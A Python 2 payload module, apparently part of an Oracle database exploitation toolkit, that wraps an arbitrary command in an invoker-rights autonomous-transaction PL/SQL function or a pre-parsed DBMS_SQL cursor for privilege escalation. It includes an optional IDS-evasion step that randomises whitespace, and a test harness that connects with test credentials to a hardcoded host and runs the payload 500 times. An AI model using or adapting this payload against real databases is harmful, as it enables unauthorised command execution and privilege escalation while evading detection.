#!/usr/bin/python

import sys
import cx_Oracle

from lib.oracleids import randomizeSpaces

data = """
CREATE OR REPLACE FUNCTION %NAME%
  RETURN NUMBER AUTHID CURRENT_USER
IS
  PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
  EXECUTE IMMEDIATE '%COMMAND%';
  COMMIT;
  RETURN(1);
END;
"""

data2 = """
BEGIN
  :1 := DBMS_SQL.OPEN_CURSOR;
  DBMS_SQL.PARSE(:1,'declare pragma autonomous_transaction; begin execute immediate ''%COMMAND%'';commit;end;',0);
END;
"""

name = "run_cmd"
brief_description = "Execute a simple command wrapped in a function"

class CPayload:

    user = "TEST"
    function = "F1"
    command = "SELECT SYSDATE FROM DUAL"
    idsTechniques = 0
    covert = 0
    cursorId = None
    connection = None
    method = 1

    type = 0

    def __init__(self):
        pass

    def run(self):
        if self.method == 1:
            tmp = data2
        else:
            tmp = data

        tmp = tmp.replace("%NAME%", '"' + self.function + '"')

        if self.command == "SELECT SYSDATE FROM DUAL" or self.command == "":
            self.command = raw_input("Command to execute: ")
        tmp = tmp.replace("%COMMAND%", self.command.replace("'", "''"))

        if self.covert > 0:
            # Currently only one IDS evasion technique is used
            tmp = randomizeSpaces(tmp)

        c = self.connection.cursor()

        if self.method == 1:
            self.cursorId = c.var(cx_Oracle.NUMBER)
            c.execute(tmp, (self.cursorId, ))
            self.cursorId = int(self.cursorId.getvalue())
            self.function = "dbms_sql.execute(%d)" % self.cursorId
        else:
            tmp = tmp.replace("%USER", self.user)

        return tmp

    def verify(self, connection):
        print "[!] You need to verify yourself!"
        return False

def main():
    import cx_Oracle

    a = CPayload()
    cmd = a.run()

    link    =  "test/test@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.1.10)(PORT=1521)))"
    link += "(CONNECT_DATA=(SERVICE_NAME=orcl)))"

    connection = cx_Oracle.connect(link)
    connection.rollback()
    connection.commit()

    for n in range(1, 500):
        print "Test",n
        cur = connection.cursor()
        cur.execute(cmd)        
        cur.execute("SELECT * FROM USER_ERRORS")

        for x in cur.fetchall():
            print x

    print "Done"

if __name__ == "__main__":
    main()
